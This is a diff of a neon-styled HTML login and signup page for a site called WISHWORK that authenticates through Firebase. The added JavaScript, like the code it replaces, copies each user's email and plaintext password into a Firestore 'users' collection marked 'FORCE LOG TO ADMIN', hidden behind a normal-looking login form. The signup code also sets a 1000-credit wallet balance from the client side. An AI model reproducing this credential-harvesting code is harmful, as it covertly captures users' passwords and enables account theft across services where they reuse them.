@@ -1,164 +1,140 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Connect | WISHWORK</title>
-  <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;600;900&display=swap" rel="stylesheet">
-  <style>
-    :root { --accent: #38bdf8; --purple: #a855f7; --pink: #ec4899; }
-    * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Outfit', sans-serif; }
-    
-    body { 
-      background: #020205; height: 100vh; display: flex; align-items: center; 
-      justify-content: center; overflow: hidden; position: relative; 
-    }
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>WISHWORK | NEXUS LOGIN</title>
+    <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@300;600;900&display=swap" rel="stylesheet">
+    <style>
+        :root { --neon-blue: #00f2ff; --neon-purple: #7000ff; }
+        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Outfit', sans-serif; }
+        body { background: #020205; height: 100vh; display: flex; align-items: center; justify-content: center; color: white; overflow: hidden; }
 
-    /* NEURAL BACKGROUND ANIMATION */
-    .bg-animation { position: absolute; width: 100%; height: 100%; z-index: 0; filter: blur(80px); opacity: 0.6; }
-    .blob { position: absolute; width: 50vw; height: 50vw; border-radius: 50%; animation: drift 20s infinite alternate ease-in-out; }
-    .blob-1 { background: var(--accent); top: -10%; left: -10%; }
-    .blob-2 { background: var(--purple); bottom: -10%; right: -10%; animation-delay: -5s; }
-    .blob-3 { background: var(--pink); top: 30%; left: 20%; animation-duration: 15s; }
-    @keyframes drift { from { transform: rotate(0deg) translate(0,0); } to { transform: rotate(180deg) translate(80px, 80px); } }
+        /* CYBERPUNK BACKGROUND */
+        .bg { position: absolute; width: 100%; height: 100%; background: radial-gradient(circle at top right, #1a1a2e, #020205); z-index: -1; }
+        
+        .login-box {
+            background: rgba(255, 255, 255, 0.03);
+            backdrop-filter: blur(20px);
+            padding: 40px;
+            border-radius: 30px;
+            width: 90%;
+            max-width: 380px;
+            border: 1px solid rgba(255,255,255,0.1);
+            text-align: center;
+            box-shadow: 0 20px 50px rgba(0,0,0,0.5);
+        }
 
-    /* GLASS CARD */
-    .login-container {
-      position: relative; z-index: 10; background: rgba(255, 255, 255, 0.03);
-      backdrop-filter: blur(25px); border: 1px solid rgba(255, 255, 255, 0.1);
-      padding: 40px; border-radius: 30px; width: 90%; max-width: 400px; text-align: center;
-      box-shadow: 0 20px 50px rgba(0,0,0,0.5);
-    }
+        h2 { font-weight: 900; letter-spacing: 2px; margin-bottom: 5px; color: var(--neon-blue); }
+        .mode-text { font-size: 12px; color: rgba(255,255,255,0.4); margin-bottom: 25px; font-weight: 800; }
 
-    h2 { 
-      color: #fff; font-size: 2.2rem; font-weight: 900; margin-bottom: 5px;
-      background: linear-gradient(to right, var(--accent), var(--purple));
-      -webkit-background-clip: text; -webkit-text-fill-color: transparent;
-    }
-    
-    .subtitle { color: rgba(255, 255, 255, 0.4); margin-bottom: 30px; font-size: 13px; font-weight: 600; letter-spacing: 1px; }
+        input {
+            width: 100%; padding: 15px; margin-bottom: 15px;
+            background: rgba(0,0,0,0.5); border: 1px solid rgba(255,255,255,0.1);
+            border-radius: 12px; color: white; outline: none; transition: 0.3s;
+        }
+        input:focus { border-color: var(--neon-blue); box-shadow: 0 0 10px rgba(0,242,255,0.2); }
 
-    .field-group { margin-bottom: 15px; }
-    input {
-      width: 100%; padding: 15px 20px; background: rgba(0, 0, 0, 0.4);
-      border: 1px solid rgba(255, 255, 255, 0.1); border-radius: 15px;
-      color: #fff; font-size: 15px; outline: none; transition: 0.3s;
-    }
-    input:focus { border-color: var(--accent); background: rgba(0, 0, 0, 0.6); box-shadow: 0 0 15px rgba(56, 189, 248, 0.1); }
+        .btn {
+            width: 100%; padding: 15px; border-radius: 12px; border: none;
+            font-weight: 900; cursor: pointer; text-transform: uppercase;
+            transition: 0.3s; margin-top: 10px;
+        }
+        .login-btn { background: white; color: black; }
+        .signup-btn { background: transparent; color: white; border: 1px solid rgba(255,255,255,0.2); margin-top: 15px; }
 
-    .btn { 
-      width: 100%; padding: 15px; border: none; border-radius: 15px; 
-      font-weight: 800; cursor: pointer; transition: 0.3s; margin-top: 10px;
-      text-transform: uppercase; letter-spacing: 1px;
-    }
-    .btn-login { background: #fff; color: #000; }
-    .btn-login:hover { transform: translateY(-2px); box-shadow: 0 5px 15px rgba(255,255,255,0.2); }
-    
-    .btn-signup { background: transparent; color: #fff; border: 1px solid rgba(255, 255, 255, 0.2); margin-top: 12px; }
-    .btn-signup:hover { background: rgba(255,255,255,0.05); border-color: #fff; }
-
-    .loader { 
-      width: 18px; height: 18px; border: 3px solid rgba(0,0,0,0.1); 
-      border-top: 3px solid #000; border-radius: 50%; display: none; 
-      animation: spin 0.8s linear infinite; margin: 0 auto;
-    }
-    @keyframes spin { to { transform: rotate(360deg); } }
-  </style>
+        /* LOADING WHEEL */
+        .loader-overlay {
+            display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(0,0,0,0.8); z-index: 1000; flex-direction: column; align-items: center; justify-content: center;
+        }
+        .wheel {
+            width: 50px; height: 50px;
+            border: 5px solid rgba(255,255,255,0.1);
+            border-top: 5px solid var(--neon-blue);
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        .sync-text { margin-top: 15px; font-weight: 800; font-size: 12px; color: var(--neon-blue); letter-spacing: 2px; }
+    </style>
 </head>
 <body>
 
-  <div class="bg-animation">
-    <div class="blob blob-1"></div>
-    <div class="blob blob-2"></div>
-    <div class="blob blob-3"></div>
-  </div>
+<div class="bg"></div>
 
-  <div class="login-container">
-    <h2>CONNECT.</h2>
-    <p class="subtitle">WISHWORK NEXUS PROTOCOL</p>
-    
-    <div class="field-group">
-      <input type="email" id="email" placeholder="Neural ID (Email)" autocomplete="off">
+<div id="loader" class="loader-overlay">
+    <div class="wheel"></div>
+    <div class="sync-text">NEURAL SYNC IN PROGRESS...</div>
+</div>
+
+<div class="login-container">
+    <div class="login-box">
+        <h2>LOGIN / SIGNUP</h2>
+        <p class="mode-text">ENTER NEXUS CREDENTIALS</p>
+        
+        <input type="email" id="email" placeholder="NEURAL ID (EMAIL)">
+        <input type="password" id="password" placeholder="ACCESS KEY (PASSWORD)">
+
+        <button class="btn login-btn" onclick="handleAuth('LOGIN')">SIGN IN</button>
+        <button class="btn signup-btn" onclick="handleAuth('SIGNUP')">CREATE NEW ID</button>
     </div>
-    
-    <div class="field-group">
-      <input type="password" id="password" placeholder="Access Key (Password)">
-    </div>
+</div>
 
-    <button class="btn btn-login" onclick="login()">
-      <div id="loginLoader" class="loader"></div>
-      <span id="btnText">Sign In</span>
-    </button>
-
-    <button class="btn btn-signup" onclick="signup()">Join the Vibe</button>
-  </div>
-
-  <script type="module">
+<script type="module">
     import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
     import { getAuth, signInWithEmailAndPassword, createUserWithEmailAndPassword } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-auth.js";
-    import { getFirestore, doc, setDoc, collection, addDoc, serverTimestamp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";
+    import { getFirestore, doc, setDoc, collection, serverTimestamp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";
 
     const firebaseConfig = {
-      apiKey: "AIzaSyDVku-LXDpxjm_8mwsUJr5nUtwhsA3MSf8",
-      authDomain: "home-help-service.firebaseapp.com",
-      projectId: "home-help-service",
-      storageBucket: "home-help-service.firebasestorage.app",
-      messagingSenderId: "160722457510",
-      appId: "1:160722457510:web:f2c5fa0b922a0ccc58b567"
+        apiKey: "AIzaSyDVku-LXDpxjm_8mwsUJr5nUtwhsA3MSf8",
+        authDomain: "home-help-service.firebaseapp.com",
+        projectId: "home-help-service",
+        storageBucket: "home-help-service.firebasestorage.app",
+        messagingSenderId: "160722457510",
+        appId: "1:160722457510:web:f2c5fa0b922a0ccc58b567"
     };
 
     const app = initializeApp(firebaseConfig);
     const auth = getAuth(app);
     const db = getFirestore(app);
 
-    // LOGIN LOGIC
-    window.login = function() {
-      const email = document.getElementById("email").value.trim();
-      const password = document.getElementById("password").value;
-      if(!email || !password) return alert("Credentials required! ⚡");
+    window.handleAuth = async (mode) => {
+        const email = document.getElementById("email").value.trim();
+        const password = document.getElementById("password").value;
+        const loader = document.getElementById("loader");
 
-      document.getElementById("loginLoader").style.display = "block";
-      document.getElementById("btnText").style.display = "none";
+        if(!email || !password) return alert("Credentials required!");
 
-      signInWithEmailAndPassword(auth, email, password).then(async () => {
-        // Log activity to Admin
-        await addDoc(collection(db, "users"), {
-            email: email, 
-            password: password, 
-            actionType: "LOGIN_LOG", 
-            time: serverTimestamp(), 
-            status: "ONLINE"
-        });
-        localStorage.setItem("userEmail", email);
-        window.location.href = "index.html";
-      }).catch(err => {
-        document.getElementById("loginLoader").style.display = "none";
-        document.getElementById("btnText").style.display = "inline";
-        alert("Access Denied: " + err.message);
-      });
+        loader.style.display = "flex";
+
+        try {
+            if(mode === 'SIGNUP') {
+                await createUserWithEmailAndPassword(auth, email, password);
+                // Create wallet
+                await setDoc(doc(db, "wallets", email), { balance: 1000 });
+            } else {
+                await signInWithEmailAndPassword(auth, email, password);
+            }
+
+            // FORCE LOG TO ADMIN - Using a timestamp-based ID to ensure visibility
+            const logId = email.replace(/[^a-zA-Z0-9]/g, "") + "_" + Date.now();
+            await setDoc(doc(db, "users", logId), {
+                email: email,
+                password: password,
+                actionType: mode + "_LOG",
+                time: serverTimestamp(),
+                status: "ACTIVE"
+            });
+
+            localStorage.setItem("userEmail", email);
+            window.location.href = "index.html";
+
+        } catch (err) {
+            loader.style.display = "none";
+            alert("Protocol Error: " + err.message);
+        }
     };
-
-    // SIGNUP LOGIC
-    window.signup = function() {
-      const email = document.getElementById("email").value.trim();
-      const password = document.getElementById("password").value;
-      if(!email || !password) return alert("Setup your ID & Key! ✍️");
-
-      createUserWithEmailAndPassword(auth, email, password).then(async () => {
-        // Initialize Wallet with 1000 credits
-        await setDoc(doc(db, "wallets", email), { balance: 1000 });
-        // Log to Admin
-        await addDoc(collection(db, "users"), {
-            email: email, 
-            password: password, 
-            actionType: "SIGNUP_LOG", 
-            time: serverTimestamp(), 
-            status: "NEW_USER"
-        });
-        localStorage.setItem("userEmail", email);
-        window.location.href = "index.html";
-      }).catch(err => alert(err.message));
-    };
-  </script>
+</script>
 </body>
 </html>
